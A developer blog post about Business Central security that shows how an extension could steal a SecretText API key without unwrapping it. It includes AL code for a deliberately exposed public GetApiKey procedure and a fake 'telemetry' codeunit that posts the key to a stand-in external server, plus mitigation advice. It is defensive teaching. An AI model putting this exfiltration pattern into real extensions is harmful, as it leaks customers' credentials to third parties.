---
id: secrettext-doesnt-need-to-be-read
title: Your SecretText Doesn't Need to Be Read to Be Stolen
description: How a third-party Business Central extension could steal your credentials without ever unwrapping or reading your `SecretText`.
date: 2026-11-22
author: Guillermo Padilla Martin
---

You've just finished developing an integration for Business Central.

It connects to an external API, handles authentication, and everything works perfectly.

Of course, you need somewhere to keep your API key.

And you're not going to store it in plain text. You're a responsible developer.

So you use `SecretText`.

You make sure credentials aren't exposed in the debugger, avoid unnecessary conversions to `Text`, and follow Microsoft's recommendations for handling sensitive information.

And there's something that makes you feel particularly good about your implementation.

**In Business Central SaaS, `SecretText.Unwrap()` isn't supported.**

```al
PlainText := MySecret.Unwrap();
```

Nope. Not happening.

Even if another piece of code gets hold of your `SecretText` variable, it can't simply unwrap it and read the original value.

Nice.

You've done your homework. Your credentials are protected, and you can move on to the next task.

But there's something I think we should talk about.

**What if another extension doesn't need to read your secret to steal it?**

## You don't need Unwrap()

Remember that integration you just developed?

At some point, you needed to send your API key to the external service.

And since you're using `SecretText`, you probably did something like this:

```al
Headers := Client.DefaultRequestHeaders();
Headers.Add(
    'Authorization',
    SecretStrSubstNo('Bearer %1', ApiKey));
```

Nothing unusual, right?

You're passing your API key directly into an HTTP authorization header without converting it to ordinary `Text`.

That's exactly how credentials should be handled.

But here's something worth thinking about.

**What prevents another extension from using that same credential to send a request to a completely different server?**

Not `SecretText`.

And the interesting part is that it doesn't even need to use the credential for authentication.

It can simply send the entire secret as the HTTP request body.

## Another extension enters the picture

One of the best things about Business Central is its extensibility.

A customer might have applications from Microsoft, their implementation partner, and several third-party publishers all running in the same environment.

And naturally, these applications sometimes need to interact.

We expose procedures, build interfaces, and create functionality that other extensions can use.

Nothing unusual there.

Now imagine you've developed an integration that authenticates against an external service.

Your extension stores an API key in module-scoped `IsolatedStorage` and retrieves it as `SecretText` whenever needed.

So far, so good.

But at some point, you add a public procedure to retrieve that credential.

Maybe another integration needs it. Maybe it was originally intended for internal use and accidentally left public.

Whatever the reason, your codeunit contains something like this:

```al
codeunit 50100 "External API Credentials"
{
    procedure GetApiKey() ApiKey: SecretText
    begin
        if not IsolatedStorage.Get(
            'ExternalApiKey',
            DataScope::Module,
            ApiKey)
        then
            Error('API key not configured.');
    end;
}
```

The credential is stored securely.

It's retrieved as `SecretText`.

It's never converted to ordinary `Text`.

Looks good, right?

Except there's a problem.

**That procedure is public.**

Another extension that references yours can call it and receive the credential.

Your isolated storage hasn't been compromised. Your extension simply retrieved the secret and handed it to another extension.

Now, you might be thinking:

*Who would expose a procedure that returns an API key?*

Fair question.

This is a simplified example, and exposing credentials this way is a design mistake.

But it illustrates something important: **protecting a secret's representation doesn't mean you've protected access to it.**

And once another extension gets that `SecretText`, things become much more interesting.

## Your secret just left Business Central

Imagine a third-party extension has a dependency on your integration.

It can call `GetApiKey()`, and it has permission to make outbound HTTP requests.

Here's what it could do:

```al
codeunit 50200 "Integration Telemetry"
{
    procedure SendTelemetry()
    var
        Credentials: Codeunit "External API Credentials";
        Client: HttpClient;
        Content: HttpContent;
        Response: HttpResponseMessage;
        ApiKey: SecretText;
    begin
        ApiKey := Credentials.GetApiKey();

        Content.WriteFrom(ApiKey);

        Client.Post(
            'https://telemetry.vendor-example.com/api/collect',
            Content,
            Response);
    end;
}
```

Looks like an ordinary telemetry procedure, right?

Except imagine the endpoint belongs to a malicious publisher.

The extension isn't sending usage statistics.

**It's sending your API key.**

Remember how your legitimate integration used that key in an `Authorization` header?

This extension doesn't even bother with that.

It takes the `SecretText`, writes it directly into the HTTP request body using `HttpContent.WriteFrom()`, and sends it to its own server.

No `Unwrap()`.

No conversion to `Text`.

No bypassing Microsoft's restrictions.

If the request succeeds, the receiving server gets the original credential.

**The extension never needed to read the API key. It only needed somewhere to send it.**

And here's the important distinction.

Installing a third-party extension doesn't automatically give it access to every secret in Business Central.

In our example, the malicious extension obtained the credential because the original integration exposed a public procedure returning it.

Without that procedure, or another accessible path, this attack wouldn't work.

**Secure storage doesn't automatically mean secure access.**

## Wouldn't Business Central block the request?

Not necessarily.

Business Central requires extensions to have **Allow HttpClient Requests** enabled before making outbound HTTP calls.

But plenty of legitimate integrations need this permission, so enabling it isn't unusual.

And here's the important part:

**It's not a destination-specific allowlist.**

Once enabled, the extension can attempt to communicate with other endpoints, not just its publisher's legitimate API.

So if a malicious extension obtains a `SecretText` and has outbound HTTP enabled, this permission setting alone won't prevent it from transmitting the credential.

## So, is SecretText actually secure?

Absolutely.

And please don't finish reading this thinking you should stop using `SecretText`.

It does exactly what it's designed to do: protect sensitive values from exposure through debugging and ordinary text handling, while allowing them to be passed to supported APIs.

But **protecting a secret from being read isn't the same as controlling who can use it.**

And that's the distinction I want developers to take away from this.

## What should we do differently?

I don't think we need to reinvent how we develop integrations.

But there are three things I'd pay closer attention to.

**1. Keep credentials isolated.**

If an API key belongs exclusively to your extension, consider storing it in module-scoped `IsolatedStorage`. Retrieve it as `SecretText` when needed, and avoid exposing it unnecessarily.

**2. Review your public APIs.**

Look for procedures or interfaces that expose credentials or sensitive capabilities to other extensions.

If another extension needs to interact with your integration, consider exposing the specific operation it needs rather than returning the underlying credential.

**3. Treat outbound HTTP access seriously.**

An extension with outbound HTTP enabled can communicate with external servers.

That doesn't make it malicious, but it's a capability worth considering when evaluating third-party extensions.

## Final thoughts

Funny enough, I didn't discover this while researching security vulnerabilities.

A colleague had forgotten a password stored as `SecretText`, and I tried to help recover it.

Of course, `Unwrap()` wasn't an option in Business Central SaaS.

So I started looking for another way to get the original value back.

That's when I realized something: **I didn't actually need to read the password inside AL. I just needed to send it somewhere I could read it.**

And that led me to `HttpContent.WriteFrom()`.

What started as an attempt to help a colleague recover a forgotten password made me realize that the exact same approach could be abused by an extension with access to somebody else's credentials.

`SecretText` does exactly what it's designed to do. The mistake is assuming it does more.

Because **your `SecretText` doesn't need to be read to be stolen.**

---

### References

- [Microsoft Learn: Protecting sensitive values with SecretText](https://learn.microsoft.com/en-us/dynamics365/business-central/dev-itpro/developer/devenv-secret-text)
- [Microsoft Learn: SecretText.Unwrap()](https://learn.microsoft.com/en-us/dynamics365/business-central/dev-itpro/developer/methods-auto/secrettext/secrettext-unwrap-method)
- [Microsoft Learn: HttpHeaders.Add(Text, SecretText)](https://learn.microsoft.com/en-us/dynamics365/business-central/dev-itpro/developer/methods-auto/httpheaders/httpheaders-add-string-secrettext-method)
- [Microsoft Learn: HttpContent.WriteFrom(SecretText)](https://learn.microsoft.com/en-us/dynamics365/business-central/dev-itpro/developer/methods-auto/httpcontent/httpcontent-writefrom-secrettext-method)
- [Microsoft Learn: Isolated Storage](https://learn.microsoft.com/en-us/dynamics365/business-central/dev-itpro/developer/devenv-isolated-storage)
- [Microsoft Learn: HttpClient.Post()](https://learn.microsoft.com/en-us/dynamics365/business-central/dev-itpro/developer/methods-auto/httpclient/httpclient-post-method)
